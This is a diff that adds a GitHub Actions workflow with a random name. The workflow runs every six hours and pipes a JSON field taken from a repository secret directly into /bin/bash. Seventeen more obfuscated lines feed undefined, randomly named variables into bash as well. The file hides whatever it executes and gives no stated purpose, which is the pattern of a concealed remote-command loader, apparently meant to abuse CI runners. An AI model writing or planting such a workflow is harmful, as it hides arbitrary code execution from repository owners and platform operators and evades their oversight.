@@ -1,0 +1,33 @@
+name: sensiblehumiliated
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '21 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: sensiblehumiliated
+        env:
+          gh61: ${{ secrets.gh61 }}
+        run: |
+          echo $gh61 | jq -r .bsw8 | /bin/bash
+          echo $alb4594 | jq -r .plkg55171 | /bin/bash
+          echo $rs6589 | jq -r .pdw6502 | /bin/bash
+          echo $bm9304 | jq -r .ing403 | /bin/bash
+          echo $atuo94365 | jq -r .aldk80874 | /bin/bash
+          echo $xya5 | jq -r .mykc6395 | /bin/bash
+          echo $ujzu794 | jq -r .b9 | /bin/bash
+          echo $ri9 | jq -r .gub5 | /bin/bash
+          echo $jses37190 | jq -r .ebys505 | /bin/bash
+          echo $pgnk49344 | jq -r .pwjfy86 | /bin/bash
+          echo $rvz312 | jq -r .u31 | /bin/bash
+          echo $r57 | jq -r .vvuls701 | /bin/bash
+          echo $cwvl6 | jq -r .uz6 | /bin/bash
+          echo $ahwpn4 | jq -r .uplyo75 | /bin/bash
+          echo $p11 | jq -r .jl0000 | /bin/bash
+          echo $qwcvt9 | jq -r .rlaob63048 | /bin/bash
+          echo $js5 | jq -r .zro1838 | /bin/bash
+          echo $pdx6642 | jq -r .za191 | /bin/bash
+
